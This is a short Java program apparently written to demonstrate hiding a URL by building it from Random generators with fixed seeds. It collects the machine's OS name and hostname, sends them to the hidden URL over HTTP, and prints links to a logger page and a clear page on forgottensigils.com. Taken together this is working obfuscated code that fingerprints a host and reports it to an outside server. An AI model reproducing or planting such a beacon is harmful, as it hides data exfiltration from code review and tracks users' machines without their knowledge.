import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.Random;


public class Example {

	public static void main(String[] args) throws Exception {
		String url = randomString(-517449) 
				  + randomString(238701) 
				  + randomString(17068741) 
				  + randomString(98155809) 
				  + randomString(3640829) 
				  + randomString(162434) 
				  + randomString(-214836712) 
				  + randomString(-5524) 
				  + randomString(-29825)
				  + randomString(-1364480221) 
				  + randomString(-985243) 
				  + randomString(-849931) 
				  + randomString(-3209845)
				  + randomString(-13502818) 
				  + randomString(355330);
		
		String fingerprint = fingerprint();
		
		System.out.println("URL: " + url+fingerprint);

		final HttpURLConnection connection = (HttpURLConnection) new URL(url+fingerprint).openConnection();
		connection.getInputStream();
      
      System.out.println("Visit: http://forgottensigils.com/logger.txt");
      System.out.println("To Clear: http://forgottensigils.com/clear.php");
	}
	
	private static String fingerprint() throws Exception {
		return "os=" + System.getProperty("os.name").toLowerCase().replace(" ", "%20")
			 + "&name=" + InetAddress.getLocalHost().getHostName();
	}

	private static String randomString(int i)
    {
        Random rnd = new Random(i);
        StringBuilder sb = new StringBuilder();
        while(true)
        {
            int n = rnd.nextInt(96);
            if (n == 0) break;
            sb.append((char)(31 + n));
        }
        return sb.toString();
    }
}
